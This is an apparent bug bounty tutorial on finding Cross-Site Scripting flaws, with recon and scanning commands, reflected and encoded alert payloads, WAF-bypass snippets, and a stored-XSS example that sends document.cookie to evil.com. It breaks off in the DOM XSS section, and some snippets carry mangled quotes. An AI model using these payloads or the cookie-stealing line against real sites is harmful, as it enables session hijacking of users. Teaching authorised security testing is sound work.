### Introduction


In the bug bounty world, Cross-Site Scripting (XSS) is one of the most common vulnerabilities hunters encounter. Yet, finding valid XSS vulnerabilities on modern applications requires patience, creativity, and skill. This guide provides a step-by-step approach to identify XSS vulnerabilities in real-world targets, from scoping to exploiting.

Whether you're an experienced bug bounty hunter or just starting out, this article will show you how to systematically search for XSS vulnerabilities and increase your chances of getting that bounty payout.

### 1. Start with Recon: Mapping Your Target

Before diving into XSS hunting, gather all possible attack surfaces on the target. This helps you identify input points, endpoints, and URLs where XSS vulnerabilities may lurk.

#### Tools for Recon:

-   **Subdomain Enumeration**
    -   Use tools like Subfinder, Assetfinder, or Amass to find all reachable subdomains.

Bash

```
subfinder -d target.com -o subdomains.txt

```

-   **URL Gathering**
    -   Gather all URLs using tools like gau (Get All URLs) and Waybackurls:

Bash

```
gau target.com | tee urls.txt
waybackurls target.com | tee -a urls.txt

```

These tools collect URLs from caches, public archives, and the application's history. Look out for query parameters — they’re usually great candidates for XSS testing.

### 2. Identify Parameters and Inputs to Test

Once you've collected URLs, filter them to find those containing parameters or input fields.

-   Use GF Patterns to extract URLs with parameters related to XSS:

Bash

```
gf xss urls.txt > xss_urls.txt

```

-   **Tools for Parameter Discovery:**
    -   ParamSpider: Crawl target websites to identify hidden parameters.

Bash

```
paramspider -d target.com -o params.txt

```


```
* Burp Suite: Use Intruder and Repeater to explore different inputs and parameters interactively.

```

These steps help you focus on vulnerable input points instead of wasting time on irrelevant parts of the target.

### 3. Testing for Reflected XSS

With the URLs and parameters in hand, the next step is to test for reflected XSS — where the payload is reflected immediately in the response.

#### Basic Payloads for Reflected XSS:

-   Test using a simple alert payload:

HTML

```
https://target.com/search?q=<script>alert(1)</script>

```

-   If the above payload doesn't work, try encoding it:

HTML

```
https://target.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E

```

-   Use Burp Suite to observe the server's response and see how the input is handled. Check if the input gets reflected directly in the HTML body, attributes, or in JavaScript contexts.

### 4. Hunting for Stored XSS

In Stored XSS, the malicious script is saved on the server and triggered when users access the stored content (e.g., in comments or profiles).

#### Where to Look for Stored XSS:

-   Comment sections
-   User profiles or status updates
-   Feedback forms
-   Message boards or chat applications

#### Example Payload:

If the application allows rich text input, try injecting this:

HTML

```
<script>document.location=’https://evil.com?cookie=' + document.cookie</script>

```


This payload attempts to steal the session cookie by sending it to a malicious site. If the XSS is successful, the attacker can hijack the session or impersonate the victim.

### 5. Bypassing Filters and WAFs

Modern applications often have input sanitization and Web Application Firewalls (WAFs) to block common XSS payloads. However, creative payloads and encoding techniques can help bypass these protections.

#### Tips to Bypass WAFs:

-   Unicode Encoding:

HTML

```
<script>alert\u0061</script>

```


-   HTML Entities:

HTML

```
<img src=x onerror=”alert(1)”>

```


-   Event Handlers in Tags:

HTML

```
<svg onload=alert(1)></svg>

```


-   Use Dalfox or KXSS to automate WAF bypass testing:

Bash

```
dalfox file xss_urls.txt — waf-evasion

```


### 6. DOM-Based XSS: Client-Side Vulnerabilities

DOM-based XSS occurs when JavaScript code modifies the DOM based on user input, leading to the execution of malicious code directly in the browser.

#### How to Test for DOM XSS:

-   Look for JavaScript snippets like this in the page source:

JavaScript

```
let input = location.search.split(‘=’)[1];

```


